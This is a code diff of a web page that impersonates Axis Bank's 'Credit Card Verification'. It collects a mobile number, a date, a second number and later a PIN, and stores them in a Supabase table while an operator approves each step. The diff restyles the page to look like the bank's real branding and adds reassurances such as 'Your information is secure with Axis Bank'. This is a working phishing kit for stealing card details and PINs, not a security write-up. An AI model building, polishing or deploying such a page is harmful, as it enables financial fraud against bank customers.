@@ -16,30 +16,28 @@
         
         body {
             font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #0a1428 0%, #001233 100%);
+            background: linear-gradient(135deg, #f8f9fc 0%, #eef2f8 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
-            overflow: hidden;
         }
 
         .container {
             width: 100%;
             max-width: 460px;
-            background: rgba(255,255,255,0.08);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255,255,255,0.12);
-            border-radius: 24px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0, 51, 160, 0.12);
             overflow: hidden;
+            border: 1px solid #e0e7ff;
         }
 
         .header {
-            background: linear-gradient(135deg, #003087, #002366);
+            background: linear-gradient(135deg, #003087, #0047cc);
             color: white;
-            padding: 32px 25px;
+            padding: 30px 25px;
             text-align: center;
             position: relative;
         }
@@ -50,7 +48,7 @@
             bottom: 0;
             left: 0;
             right: 0;
-            height: 4px;
+            height: 5px;
             background: linear-gradient(to right, #ffcc00, #ffd633);
         }
 
@@ -58,28 +56,28 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 14px;
-            margin-bottom: 12px;
+            gap: 12px;
+            margin-bottom: 10px;
         }
 
         .logo-circle {
             background: white;
             color: #003087;
-            width: 54px;
-            height: 54px;
+            width: 52px;
+            height: 52px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: 900;
-            font-size: 30px;
-            box-shadow: 0 6px 15px rgba(0,0,0,0.3);
+            font-size: 28px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
         }
 
         .logo-text {
-            font-size: 36px;
+            font-size: 34px;
             font-weight: 700;
-            letter-spacing: -2px;
+            letter-spacing: -1.8px;
         }
 
         .content {
@@ -88,45 +86,45 @@
 
         h2 {
             text-align: center;
-            color: white;
-            font-size: 28px;
+            color: #1a2533;
+            font-size: 27px;
             margin-bottom: 8px;
             font-weight: 700;
         }
 
         .subtitle {
             text-align: center;
-            color: #a0b4ff;
+            color: #455569;
             font-size: 15.5px;
             margin-bottom: 32px;
         }
 
         .inputBox {
-            margin-bottom: 24px;
+            margin-bottom: 26px;
         }
 
         label {
             display: block;
             margin-bottom: 8px;
-            color: #c0d0ff;
+            color: #1a2533;
+            font-weight: 600;
             font-size: 14.5px;
-            font-weight: 500;
         }
 
         input {
             width: 100%;
-            padding: 16px 18px;
-            border: 1.5px solid rgba(255,255,255,0.15);
+            padding: 15px 18px;
+            border: 2px solid #d0d7e5;
             border-radius: 12px;
-            background: rgba(255,255,255,0.07);
-            color: white;
+            background: #fff;
+            color: #1a2533;
             font-size: 16px;
             transition: all 0.3s;
         }
 
         input:focus {
-            border-color: #ffcc00;
-            box-shadow: 0 0 0 4px rgba(255, 204, 0, 0.15);
+            border-color: #003087;
+            box-shadow: 0 0 0 4px rgba(0, 48, 135, 0.1);
             outline: none;
         }
 
@@ -135,7 +133,7 @@
             padding: 16px;
             border: none;
             border-radius: 12px;
-            background: linear-gradient(135deg, #ff0080, #7928ca);
+            background: linear-gradient(135deg, #003087, #0047cc);
             color: white;
             font-size: 17px;
             font-weight: 600;
@@ -145,37 +143,37 @@
         }
 
         button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 25px rgba(255, 0, 128, 0.4);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0, 48, 135, 0.25);
         }
 
         #status {
             margin-top: 25px;
-            min-height: 80px;
+            min-height: 90px;
         }
 
         .wait {
-            color: #ffd166;
+            color: #0066cc;
             font-weight: 600;
         }
 
         .reject {
-            color: #ff4d6d;
-            font-size: 22px;
+            color: #d32f2f;
+            font-size: 21px;
             font-weight: 700;
         }
 
         .success {
-            color: #00ff95;
-            font-size: 30px;
+            color: #008000;
+            font-size: 28px;
             font-weight: 700;
         }
 
         .loader {
-            width: 48px;
-            height: 48px;
-            border: 4px solid rgba(255,255,255,0.2);
-            border-top: 4px solid #ffcc00;
+            width: 46px;
+            height: 46px;
+            border: 4px solid #e0e7ff;
+            border-top: 4px solid #003087;
             border-radius: 50%;
             margin: 15px auto;
             animation: spin 1s linear infinite;
@@ -187,9 +185,9 @@
 
         .secure {
             text-align: center;
-            margin-top: 20px;
-            color: #88aaff;
-            font-size: 13.5px;
+            margin-top: 22px;
+            color: #0066cc;
+            font-size: 14px;
         }
     </style>
 </head>
@@ -200,12 +198,12 @@
                 <div class="logo-circle">A</div>
                 <div class="logo-text">axis</div>
             </div>
-            <p style="font-size:15px; opacity:0.9;">Premium Verification System</p>
+            <p style="font-size:15px; opacity:0.95;">Credit Card Verification</p>
         </div>
 
         <div class="content">
-            <h2>Secure Verification</h2>
-            <p class="subtitle">Instant approval in few seconds</p>
+            <h2>Premium Verification</h2>
+            <p class="subtitle">Secure & Instant Approval System</p>
 
             <div class="inputBox">
                 <label>Mobile Number</label>
@@ -224,7 +222,7 @@
 
             <button onclick="submitForm()">Continue Securely</button>
 
-            <div class="secure">🔒 256-Bit SSL Encrypted • Axis Bank Trusted</div>
+            <div class="secure">🔒 Your information is secure with Axis Bank</div>
         </div>
 
         <div id="status"></div>
@@ -261,23 +259,19 @@
 
         const { data, error } = await client
             .from('requests')
-            .insert([
-                {
-                    number1: number1,
-                    date_value: date_value,
-                    number2: number2,
-                    status: 'pending',
-                    pin: '',
-                    pin_status: 'waiting'
-                }
-            ])
+            .insert([{
+                number1: number1,
+                date_value: date_value,
+                number2: number2,
+                status: 'pending',
+                pin: '',
+                pin_status: 'waiting'
+            }])
             .select();
 
         if(error){
             console.log(error);
-            document.getElementById('status').innerHTML = `
-                <div class="reject">Error Submitting Form</div>
-            `;
+            document.getElementById('status').innerHTML = `<div class="reject">Error Submitting Form</div>`;
             return;
         }
 
@@ -297,20 +291,15 @@
                 .eq('id', currentId)
                 .single();
 
-            if(error){
-                console.log(error);
-                return;
-            }
+            if(error) return;
 
             const statusDiv = document.getElementById('status');
 
             if(data.status === 'pending'){
-                if(!statusDiv.innerHTML.includes('Waiting For Admin')){
-                    statusDiv.innerHTML = `
-                        <div class="loader"></div>
-                        <div class="wait">Waiting For Admin Approval...</div>
-                    `;
-                }
+                statusDiv.innerHTML = `
+                    <div class="loader"></div>
+                    <div class="wait">Waiting For Admin Approval...</div>
+                `;
             }
             else if(data.status === 'rejected'){
                 clearInterval(interval);
@@ -320,18 +309,16 @@
                 if(data.pin_status === 'waiting'){
                     if(!document.getElementById('pin')){
                         statusDiv.innerHTML = `
-                            <input type="text" id="pin" placeholder="Enter PIN" style="margin-bottom:15px;">
+                            <input type="text" id="pin" placeholder="Enter PIN" style="margin-bottom:15px; width:100%;">
                             <button onclick="submitPin()">Submit PIN</button>
                         `;
                     }
                 }
                 else if(data.pin_status === 'pending'){
-                    if(!statusDiv.innerHTML.includes('Waiting For PIN')){
-                        statusDiv.innerHTML = `
-                            <div class="loader"></div>
-                            <div class="wait">Waiting For PIN Approval...</div>
-                        `;
-                    }
+                    statusDiv.innerHTML = `
+                        <div class="loader"></div>
+                        <div class="wait">Waiting For PIN Approval...</div>
+                    `;
                 }
                 else if(data.pin_status === 'rejected'){
                     clearInterval(interval);
@@ -364,17 +351,11 @@
 
         const { error } = await client
             .from('requests')
-            .update({
-                pin: pin,
-                pin_status: 'pending'
-            })
+            .update({ pin: pin, pin_status: 'pending' })
             .eq('id', currentId);
 
         if(error){
-            console.log(error);
-            document.getElementById('status').innerHTML = `
-                <div class="reject">Error Submitting PIN</div>
-            `;
+            document.getElementById('status').innerHTML = `<div class="reject">Error Submitting PIN</div>`;
         }
     }
     </script>
